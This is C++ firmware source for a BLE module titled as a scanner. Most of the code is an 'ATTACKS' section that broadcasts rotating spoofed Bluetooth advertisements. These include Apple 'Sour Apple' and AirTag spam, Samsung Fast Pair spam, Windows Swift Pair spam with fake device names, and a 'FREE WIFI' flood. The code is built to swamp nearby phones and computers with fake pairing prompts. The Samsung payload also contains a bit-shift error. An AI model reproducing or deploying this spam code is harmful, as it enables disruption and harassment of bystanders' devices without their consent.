/**
 * ╔═══════════════════════════════════════════════════════════════╗
 * ║                  BLE SCANNER MODULE                           ║
 * ║   Handles Bluetooth Low Energy scanning and device tracking   ║
 * ║                                                               ║
 * ║                     by Alex R.                                ║
 * ╚═══════════════════════════════════════════════════════════════╝
 */
#include "BLEScanner.h"

BLEScanner::BLEScanner() {
    pScan = nullptr;
    // deviceCount = 0; // Removed
    totalDevices = 0;
    scanCount = 0;
    scanning = false;
    newDeviceFlag = false;
    lastScanStart = 0;
    pAdvertising = nullptr;
    attackMode = false;
    attackType = 0;
    attackStart = 0;
    lastPayloadSwitch = 0;
    payloadIndex = 0;
}

void BLEScanner::init() {
    NimBLEDevice::init("");
    pScan = NimBLEDevice::getScan();
    
    callbacks.parent = this;
    pScan->setAdvertisedDeviceCallbacks(&callbacks, true);
    pScan->setActiveScan(false);  // Passive = less power
    pScan->setInterval(100);
    pScan->setWindow(99);
    
    // Init advertising
    pAdvertising = NimBLEDevice::getAdvertising();
    
    Serial.println("[BLE] Initialized");
}

bool BLEScanner::isAttacking() {
    return attackMode;
}

void BLEScanner::stopAttack() {
    if (attackMode) {
        pAdvertising->stop();
        attackMode = false;
        attackType = 0;
        Serial.println("[BLE] Attack stopped");
    }
}

// === ATTACKS ===

void BLEScanner::sourApple() {
    if (attackMode) stopAttack();
    attackMode = true;
    attackType = 1; // Sour Apple
    attackStart = millis();
    lastPayloadSwitch = 0; // Trigger immediate update in loop
    payloadIndex = 0;
    Serial.println("[BLE] Starting Sour Apple Rotation");
}

void BLEScanner::swiftPair() {
    if (attackMode) stopAttack();
    attackMode = true;
    attackType = 3; // Swift Pair
    attackStart = millis();
    lastPayloadSwitch = 0;
    payloadIndex = 0;
    Serial.println("[BLE] Starting Swift Pair Rotation");
}

void BLEScanner::airTagSpam() {
    if (attackMode) stopAttack();
    attackMode = true;
    attackType = 4; // AirTag
    attackStart = millis();
    lastPayloadSwitch = 0;
    payloadIndex = 0;
    Serial.println("[BLE] Starting AirTag Spam Rotation");
}

// Samsung/Google Fast Pair (Watch 4 / Buds Pro)
void BLEScanner::samsungSpam() {
    if (attackMode) stopAttack();
    attackMode = true;
    attackType = 2; // Samsung
    attackStart = millis();
    lastPayloadSwitch = 0;
    payloadIndex = 0;
    Serial.println("[BLE] Starting Samsung Spam Rotation");
}

void BLEScanner::bleFlood() {
    if (attackMode) stopAttack();
    attackMode = true;
    
    Serial.println("[BLE] Starting BLE Flood");
    
    // Randomize address for every packet? 
    // NimBLE usually requires stop/start to change address.
    // For flood, we just advertise a confusing device.
    
    NimBLEAdvertisementData advert;
    advert.setName("FREE WIFI");
    
    pAdvertising->setAdvertisementData(advert);
    pAdvertising->start();
}

void BLEScanner::startScan() {
    if (scanning || !pScan) return;
    if (attackMode) stopAttack(); // Priority to scanning
    
    scanning = true;
    lastScanStart = millis();
    pScan->start(3, false);  // 3 second scan, non-blocking
    scanCount++;
    Serial.println("[BLE] Scan started");
}

void BLEScanner::loop() {
    if (!pScan) return;
    
    // Auto-stop attacks after 15s
    if (attackMode) {
        if (millis() - attackStart > 15000) {
            stopAttack();
            return;
        }

        // PAYLOAD ROTATION (Every 200ms)
        if (millis() - lastPayloadSwitch > 200) {
            lastPayloadSwitch = millis();
            pAdvertising->stop();

            NimBLEAdvertisementData advert;

            // ===================================
            // SOUR APPLE (iOS) - 13+ Types
            // ===================================
            if (attackType == 1) {
                const uint8_t types[] = { 
                    0x02, 0x05, 0x06, 0x07, 0x09, 0x0A, 0x0B, 0x0E, 0x11, 0x13, 0x14, 0x1E, 0x20
                };
                int typeCount = sizeof(types);
                payloadIndex = (payloadIndex + 1) % typeCount;
                uint8_t devType = types[payloadIndex];

                uint8_t payload[] = {
                    0x4C, 0x00, 
                    devType,    // Cycling Device Type
                    0x19,       // Length
                    0x01, 0x00, 0x20, 
                    (uint8_t)random(0,255), (uint8_t)random(0,255), (uint8_t)random(0,255), (uint8_t)random(0,255), 
                    0x00, 0x00, 0x10, 
                    0x00, 0x00, 0x00, 0x00, 0x00, 
                    0x00, 0x00, 0x00, 0x00, 0x00, 
                    0x00, 0x00, 0x00 
                };
                advert.setManufacturerData(std::string((char*)payload, sizeof(payload)));
            }
            // ===================================
            // SAMSUNG SPAM
            // ===================================
            else if (attackType == 2) {
                const uint16_t models[] = { 0xB002, 0xF002, 0x1002, 0x8002, 0x9002 };
                int modelCount = 5;
                payloadIndex = (payloadIndex + 1) % modelCount;
                uint16_t model = models[payloadIndex];

                advert.setFlags(0x06);
                advert.setCompleteServices16({NimBLEUUID("FE2C")});
                uint8_t modelData[] = { (uint8_t)((model >> 16) & 0xFF), (uint8_t)((model >> 8) & 0xFF), (uint8_t)(model & 0xFF) };
                advert.setServiceData(NimBLEUUID("FE2C"), std::string((char*)modelData, 3));
            }
            // ===================================
            // SWIFT PAIR (Windows)
            // ===================================
            else if (attackType == 3) {
                 const char* names[] = { "Connect Mouse", "Connect Pen", "Connect Buds", "Office PC" };
                 const uint16_t appearance[] = { 0x03C2, 0x03C1, 0x03C3, 0x0080 };
                 
                 payloadIndex = (payloadIndex + 1) % 4;
                 
                 advert.setName(names[payloadIndex]);
                 advert.setAppearance(appearance[payloadIndex]);
                 
                 uint8_t payload[] = { 0x06, 0x00, 0x03, 0x00, 0x80 };
                 advert.setManufacturerData(std::string((char*)payload, sizeof(payload)));
            }
            // ===================================
            // AIRTAG SPAM (Find My)
            // ===================================
            else if (attackType == 4) {
                uint8_t payload[] = {
                    0x4C, 0x00, 0x12, 0x19, 0x10, 
                    (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256),
                    (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256),
                    (uint8_t)random(256), (uint8_t)random(256)
                };
                advert.setManufacturerData(std::string((char*)payload, sizeof(payload)));
            }
            
            pAdvertising->setAdvertisementData(advert);
            pAdvertising->start();
        }
    }
    
    // Check if scan completed
    if (scanning && !pScan->isScanning()) {
        scanning = false;
        Serial.printf("[BLE] Scan complete. Total found: %d\n", totalDevices);
    }
}

// Methods removed for stateless scanning

bool BLEScanner::hasNewDevice() {
    return newDeviceFlag;
}

void BLEScanner::clearNewDevice() {
    newDeviceFlag = false;
}

String BLEScanner::getLastDeviceName() {
    return lastDeviceName;
}

// Helper methods removed

void BLEScanner::ScanCallbacks::onResult(NimBLEAdvertisedDevice* device) {
    if (!parent) return;
    
    // Stateless update
    parent->totalDevices++;
    parent->scanCount++;
    parent->newDeviceFlag = true;
    
    if (device->haveName()) {
        parent->lastDeviceName = device->getName().c_str();
    } else {
        parent->lastDeviceName = "Unknown Device";
    }
}
